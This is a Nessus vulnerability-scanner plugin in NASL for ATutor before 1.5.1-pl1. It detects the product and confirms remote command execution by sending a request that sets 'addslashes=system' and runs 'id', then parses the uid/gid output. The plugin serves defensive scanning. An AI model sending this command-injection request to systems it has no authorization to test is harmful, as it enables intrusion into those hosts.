#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# 
# Ref: Andreas Sandblad, Secunia Research
#
# This script is released under the GNU GPLv2
#

  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to
multiple flaws. 

Description :

The remote host is running ATutor, an open-source web-based Learning
Content Management System (LCMS) written in PHP. 

The version of ATutor installed on the remote host may be vulnerable
to arbitrary command execution, arbitrary file access, and cross-site
scripting attacks.  Successful exploitation of the first two issues
requires that PHP's 'register_globals' setting be enabled and, in some
cases, that 'magic_quotes_gpc' be disabled. 

See also :

http://secunia.com/secunia_research/2005-55/advisory/

Solution :

Apply patch 1.5.1-pl1 or upgrade to version 1.5.2 or later.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)"; 

if(description)
{
  script_id(20095);
  script_cve_id("CVE-2005-3403", "CVE-2005-3404", "CVE-2005-3405");
  script_bugtraq_id(15221);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"20344");
    script_xref(name:"OSVDB", value:"20345");
    script_xref(name:"OSVDB", value:"20346");
    script_xref(name:"OSVDB", value:"20347");
    script_xref(name:"OSVDB", value:"20348");
    script_xref(name:"OSVDB", value:"20349");
  }

  script_version("$Revision: 1.3 $");
  script_name(english:"ATutor < 1.5.1-pl1 Multiple Flaws");

  script_description(english:desc["english"]);

  script_summary(english:"Checks for remote arbitrary command in ATutor");
  script_category(ACT_GATHER_INFO);
  
  script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
  script_family(english:"CGI abuses");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


function check_dir(path)
{
  buf = http_get(item:string(path, "/login.php"), port:port);
  r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
  if( r == NULL )exit(0);
  if(egrep(pattern:"<meta name=.Generator. content=.ATutor - Copyright", string:r))
  {
    buf = http_get(item:string(path,"/include/html/forum.inc.php?addslashes=system&asc=id"), port:port);
    r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
    if( r == NULL )exit(0);

    # Isolate command output.
    pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
    matches = egrep(string:r, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        output = eregmatch(pattern:pat, string:match);
        if (!isnull(output)) {
          output = output[1];
          break;
        }
      }
    }

    # If that didn't work, perhaps just the system function is disabled.
    if (isnull(output)) {
      matches = egrep(pattern:"system\(\) has been disabled for security reasons", string:r);
      if (matches) {
        output = "";
        foreach match (split(matches)) {
          output += match;
        }
      }
    }

    if (output) {
      if (report_verbosity > 0) {
        report = string(
          desc["english"],
          "\n\n",
          "Plugin output :\n",
          "\n",
          output
        );
      }
      else report = desc["english"];

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}

port = get_http_port(default:80);
if ( ! port ) exit(0);
if(!can_host_php(port:port)) exit(0);

foreach dir (cgi_dirs())
{
	check_dir(path:dir);
}

